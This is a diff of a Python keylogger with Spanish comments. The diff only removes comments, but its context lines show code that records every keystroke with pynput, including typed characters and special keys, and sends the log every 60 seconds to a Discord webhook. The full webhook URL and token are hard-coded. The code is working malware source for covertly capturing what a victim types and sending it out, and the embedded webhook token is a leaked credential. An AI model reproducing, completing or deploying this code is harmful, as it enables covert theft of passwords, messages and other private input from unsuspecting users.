@@ -6,12 +6,11 @@ from pynput.keyboard import Listener, Key
 import requests
 import sys
 
-# URL del webhook de Discord donde se enviarán los logs
+# URL del webhook
 WEBHOOK_URL = os.getenv(
     "DISCORD_WEBHOOK_URL",
     "https://discord.com/api/webhooks/1257403688264270016/Nx2xq3OEwEK3bYNZn-3dCLaw7u_4O665GZKiV5wOofbg-B62wGUWtKKBtcpuQsv78q1z",
 )
-# Intervalo de tiempo entre cada reporte, expresado en segundos
 TIME_INTERVAL = 60
 
 
@@ -71,7 +70,7 @@ class Keylogger:
             finally:
                 self.log = ""
 
-        # Reinicia el temporizador para enviar el siguiente reporte después del intervalo especificado
+      
         Timer(self.interval, self._report).start()
 
     def _on_key_press(self, key):
@@ -81,11 +80,11 @@ class Keylogger:
         :param key: La tecla que fue presionada.
         """
         try:
-            # Omitir teclas Shift
+          
             if key in (Key.shift, Key.shift_r):
                 return
 
-            # Manejar teclas especiales
+           
             if key == Key.space:
                 self.log += " "
             elif key == Key.enter:
@@ -96,15 +95,15 @@ class Keylogger:
                 if key == Key.alt_l or key == Key.alt_r:
                     self.log += " [ALT + TAB] "
                 else:
-                    self.log += "[TAB]"  # Insertar cuatro espacios en lugar de un tab
+                    self.log += "[TAB]"  
             elif key == Key.ctrl_l or key == Key.ctrl_r:
                 self.log += " [CTRL] "
             elif key == Key.alt_l or key == Key.alt_r:
                 self.log += " [ALT] "
             elif hasattr(key, "char"):
-                self.log += key.char  # Capturar el carácter si está disponible
+                self.log += key.char
             else:
-                self.log += f" [{key}] "  # Si no se puede obtener el carácter, mostrar el nombre de la tecla
+                self.log += f" [{key}] "  
 
         except Exception as e:
             logging.error(f"Error al manejar la pulsación de tecla: {str(e)}")
@@ -132,6 +131,6 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    # Crea una instancia del Keylogger y lo ejecuta
+
     keylogger = Keylogger(WEBHOOK_URL, TIME_INTERVAL)
     keylogger.run()
